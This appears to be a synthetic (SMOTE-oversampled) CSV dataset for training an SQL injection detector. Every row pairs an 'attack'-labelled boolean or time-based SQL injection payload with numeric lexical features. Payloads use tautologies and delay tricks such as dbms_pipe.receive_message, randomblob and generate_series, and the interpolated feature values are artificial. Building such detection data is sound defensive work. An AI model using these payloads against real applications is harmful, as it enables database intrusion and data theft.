id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000285,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,1.1419519738650903,83.041236382748,26.71315936166141,3.7190140342966806,21.32807702108658,19.09824170223624,31.3771978722047,11.23771978722047,0.2529240281878133,0.2348226701528158,0.3763980454647257,0.1358552561946452,1.76228021277953,0.0,0.0,0.0,1.0,1.7622802127795298,0.0,4.71315936166141,0.0,0.23771978722046994,0.23771978722046994,4.28684063833859,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.76228021277953,0.23771978722047019,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,1.605882156359073,131.68061360710607,32.42015340177652,3.6499014610466065,38.36122721421211,19.638772785787893,56.0,17.680613607106054,0.29093789102174866,0.14962034151486722,0.4253665693456981,0.134075198117686,2.0,1.680613607106054,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.4201534017765135,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000008,2.4650290755905626,156.85623836731236,35.194311836715826,3.9334027538033896,49.661926530596524,19.726697142835135,58.40284408164209,29.06477061223861,0.3164380550591282,0.12513414498778136,0.3731279189881945,0.1852998809648959,3.467614693880695,0.0,1.0647706122386098,0.0,0.0,2.0,0.0,11.467614693880694,0.0,2.0,1.0,10.129541224477219,1.0,0.0,0.5323853061193048,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5323853061193048,0.0,0.5323853061193047,0.0,1.0,0.46761469388069515,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5323853061193047
SMOTE_000288,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000045,0.6167905979026891,74.48783815232326,25.149806770100987,3.705595364002754,13.787451692525245,24.0,25.70038645979803,11.0,0.18555723277770841,0.3226527199219591,0.3439075506694345,0.14788249663089795,0.0,1.0,3.0,0.0,0.2125483074747539,2.0,0.0,3.212548307474753,0.0,0.7874516925252463,0.7874516925252464,5.212548307474753,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,2.549385725527986,104.87225132476877,29.0,3.601847024740974,36.436125662384384,13.0,43.11925954364264,12.316866118741743,0.34525840231823757,0.12572754811643197,0.410402479378672,0.11861157018665844,1.9505983562252245,0.0,0.0,0.0,0.6831338812582585,1.0,0.0,7.316866118741742,0.0,0.6831338812582585,0.6831338812582586,1.6831338812582586,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3168661187417415,0.0,1.0,0.0,0.0,0.6831338812582584,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31686611874174153,0.31686611874174153,3.3168661187417414
SMOTE_000290,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000018,0.5386986903098527,63.193308846746575,26.501520716648507,3.869347294337119,12.099695856670301,16.0,21.99391713340598,13.099695856670298,0.19272402549791218,0.25536382746436004,0.3432278823232931,0.2086842647144347,0.0,4.0,1.0,0.0,0.09969585667029895,2.0,0.0,2.398783426681196,1.8006082866594022,0.9003041433297011,0.9003041433297011,3.099695856670299,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,1.81628735934209,73.93611924374164,26.677782424995222,3.7531152458800925,17.033347274985665,16.0,27.16110878750239,13.741663181253584,0.22718205590449303,0.2168692835139281,0.368766230604533,0.18718242997704584,0.0,4.0,1.0,0.0,0.0,1.5805543937511948,0.0,4.0,1.1611087875023893,1.0,1.0,2.5805543937511946,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000057,0.9206018833924887,153.18228777411628,34.136285370980616,3.887064030094321,59.54514148392248,10.0,57.909717032155044,25.72742925803876,0.3889170239492454,0.065293836532943,0.3778668587346006,0.16792228078321103,0.408856112941858,2.5911438870581414,0.0,0.0,0.0,0.8637146290193807,0.0,11.86371462901938,0.0,2.0,1.0,6.8637146290193805,0.13628537098061938,0.8637146290193806,0.0,0.0,0.0,0.8637146290193806,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,1.870022229538036,159.89754855177335,34.09354083571137,3.881150303682322,49.09354083571137,20.187081671422746,61.57015562678353,29.04677041785569,0.30723509477527083,0.12527154507869998,0.3856528140388644,0.18184054610716477,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,9.046770417855686,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5233852089278432,0.0,0.5233852089278433,0.0,0.4766147910721567,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5233852089278432
SMOTE_000294,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,1.5310489091128052,96.31106349074278,29.445402346216138,3.7207326068557007,32.168103519324205,15.57147998570929,36.52945410587824,12.042025879831051,0.33866406167404667,0.14842715801914522,0.3840631743079737,0.12884560599883443,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.722701173108068,0.0,0.680675293277017,0.6806752932770171,5.319324706722983,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000295,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,0.31717071704721084,146.47887250606317,34.0,3.830535330479286,41.0,24.0,55.58309800485054,25.895774501212635,0.27993514550404375,0.16386447541700122,0.3794145130963635,0.1767858659825915,0.8957745012126366,0.10422549878736354,2.0,0.0,0.0,2.0,0.0,10.895774501212635,0.0,2.0,1.0,10.0,0.8957745012126366,0.10422549878736354,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,1.7930088602408338,73.89848838713456,26.656279078362612,3.75104571499309,16.96883723508784,16.0,27.171860460818692,13.75779069122804,0.22643654442860628,0.2169780039374949,0.36909433331136854,0.1874911183225302,0.0,4.0,1.0,0.0,0.0,1.5859302304093468,0.0,4.0,1.1718604608186936,1.0,1.0,2.585930230409347,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000066,0.10176295603520455,142.0,33.49764748549709,3.90296575835918,41.0,24.0,52.0,25.0,0.2887323943661972,0.16901408450704225,0.36619718309859156,0.176056338028169,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,2.3093292918167547,134.11534491796374,34.57209057372734,3.761396752175679,39.11534491796373,23.0,54.971163770509065,17.028836229490935,0.291023286912294,0.1716469936949183,0.4104677800869682,0.1268619393058195,2.0,0.5144181147454667,1.0288362294909335,1.0,0.0,2.0,0.0,9.485581885254533,0.0,0.0,1.0,4.028836229490933,1.0,0.5144181147454667,0.5144181147454667,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5144181147454668,0.0,1.4855818852545333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,3.695997361918507,136.37095841617804,31.619501890173726,4.294048446830806,81.90249054913139,5.902490549131377,33.18547920808903,15.380498109826275,0.6028042769268006,0.042189320657505414,0.24182205961282457,0.1131843428028694,0.3804981098262752,1.8585056705211742,0.0,0.0,1.0,1.0,0.0,3.7609962196525504,0.0,0.0,3.0,2.0,0.3804981098262752,0.6195018901737248,0.0,0.3804981098262752,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000300,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,2.1413397942126418,111.66835347962444,29.46051827138386,3.964445055377169,52.652560788177986,11.03158538289291,34.507896345723225,13.476310962830318,0.4505216949397537,0.1058568680994908,0.32114568253110454,0.12247575442965096,0.0,0.0,2.0,0.0,1.0,1.0,0.0,5.015792691446455,0.0,0.5078963457232276,1.9842073085535445,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000301,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,0.7676994461668238,95.13312736339921,28.653250945359687,3.6218862325229764,31.826625472679844,13.0,38.306501890719375,12.0,0.3346034763906238,0.13670665570922735,0.4024991087839389,0.12619075911620986,0.8266254726798432,0.0,0.3467490546403136,0.0,1.0,1.0,0.0,6.826625472679844,0.0,1.0,1.0,2.3467490546403136,0.8266254726798432,0.0,0.17337452732015682,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8266254726798432,0.17337452732015685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,0.050883944159486154,96.20907875134269,29.01493419652448,3.612257972717639,32.0,13.0,39.14934196524478,12.059736786097911,0.3326997613595676,0.13515927805232433,0.406835488386471,0.12530547220163704,1.0,0.0,0.02986839304895572,0.0,1.0,1.0,0.0,7.029868393048956,0.0,1.0,1.0,2.0298683930489556,1.0,0.0,0.01493419652447775,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,0.495704815175065,128.22619196332673,31.113095981663356,3.5495944883470822,35.0,15.904767853306852,56.0,21.32142411001986,0.2729617356540604,0.12394335371234234,0.43673877704649666,0.16635613358710064,5.547616073346573,0.0,0.0,1.0,0.0,2.0,0.0,10.0,1.7738080366732867,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,2.330737868735616,156.82914501260205,34.2814069250157,3.9198025866391495,46.70351731253925,24.0,58.27386904379317,27.851758656269624,0.2971958632152871,0.15409542755271424,0.37121788495822117,0.1774908242737775,2.2814069250156983,0.4296482687460754,0.8592965374921508,0.0,0.0,2.0,0.0,11.14070346250785,0.0,2.0,1.0,10.0,0.5703517312539246,0.4296482687460754,0.4296482687460754,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5703517312539246,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5703517312539246
SMOTE_000305,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000044,0.8043939396027745,77.51143917599796,27.179162159058347,3.865389439742727,18.15311485788128,23.38437161929376,25.589581079529175,10.38437161929376,0.23151495369761269,0.30282784740332624,0.33207149862382634,0.13358570027523473,0.0,0.7947905397645867,2.7947905397645867,0.0,0.0,2.0,0.0,3.0,0.0,0.7947905397645867,1.0,4.794790539764587,0.0,0.7947905397645867,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2052094602354133,0.7947905397645867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,2.3651611107297823,133.52018653179,31.230878460775997,4.26017941439285,79.36579422790999,7.230878460775999,30.365794227909994,16.557719615194,0.5973606086320883,0.0530860244830751,0.2238464875946285,0.12570687929020818,3.557719615194,0.0,0.0,0.0,1.0,1.0,0.0,3.115439230387999,0.0,2.2114019240300022,3.442280384806,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5577196151939996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5577196151939994
SMOTE_000307,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000019,0.29206604321414553,141.086313013176,30.114210873353,3.888136753542121,47.37184019655851,15.9428945633235,51.885789126647,25.885789126646998,0.33549397961540683,0.11303990720887105,0.3679462206180819,0.18351989255764017,0.0,3.7715782532940016,0.11421087335299895,0.0,0.0,1.9428945633235006,0.0,10.0571054366765,0.0,2.0,1.0,8.0571054366765,0.0,0.9428945633235004,0.057105436676499366,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9428945633235006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9428945633235006
SMOTE_000308,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,2.9563177053717062,131.89560150284714,36.49130012523726,3.919975546815017,43.0,21.982600250474526,50.43910087666084,16.473900375711786,0.3266901964215305,0.16666666666666666,0.38200100298052964,0.12464213393127317,1.4913001252372626,0.4913001252372625,2.0,0.4913001252372625,0.5086998747627375,2.0,0.0,7.982600250474525,0.0,0.5086998747627375,1.0,5.0,1.0,0.4913001252372625,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5086998747627375,0.0,1.0,0.5086998747627374,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0173997495254747
SMOTE_000309,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000045,0.5378872176842547,71.72179610302017,25.715954689560036,3.793103035444081,13.573932034340054,23.573932034340054,24.0,10.573932034340054,0.18895374423470498,0.3286759272333776,0.3353332391968142,0.1470370893351032,0.0,0.8579773447800185,2.8579773447800187,0.0,0.0,2.0,0.0,3.0,0.0,0.8579773447800186,1.0,4.857977344780019,0.0,0.8579773447800185,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.14202265521998148,0.8579773447800185,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,0.969012139346208,113.92816472266868,31.473061771000758,3.603924661279612,34.70061324683472,14.964082361334341,48.508979409666416,15.754489704833208,0.3032731735949799,0.13008534764445057,0.42767010560263635,0.13897137315793318,1.0,0.0,2.0,0.0,1.0,1.2455102951667927,0.0,8.508979409666415,0.0,1.0,1.0,4.245510295166793,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.24551029516679274,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2455102951667927
SMOTE_000311,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000036,0.5511745404195884,127.46287328546161,29.76856335726919,4.066036156027797,76.04146489228864,4.768563357269191,30.115718321365406,16.537126714538385,0.5964146507730381,0.0374642772101869,0.2362691608011996,0.12985191121557538,3.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,0.0,4.421408393172978,3.7685633572691914,1.0000000000000004,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,0.7103731867112617,149.75366444573393,31.723036543496427,3.8189025614027186,47.13848172825178,16.0,58.89214617398571,27.72303654349643,0.3149654188982616,0.10689027930548722,0.39303675988843423,0.18510754190781695,3.4460730869928575,0.553926913007143,0.0,0.0,0.0,2.0,0.0,11.723036543496429,0.0,2.0,1.0,8.0,0.8615182717482144,0.1384817282517857,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1384817282517856,0.8615182717482144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000313,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000066,0.6592180619226511,145.18646729984187,34.2451128692186,3.915075305852908,42.22556434609302,24.0,53.34812078070233,25.61278217304651,0.2905510134914358,0.165808382998147,0.3672760249525467,0.17636457855787047,0.49022573843720996,0.8774435653906976,1.7548871307813951,0.0,0.0,2.0,0.0,10.245112869218605,0.0,2.0,1.0,10.0,0.12255643460930238,0.8774435653906976,0.8774435653906976,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.12255643460930249,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1225564346093027
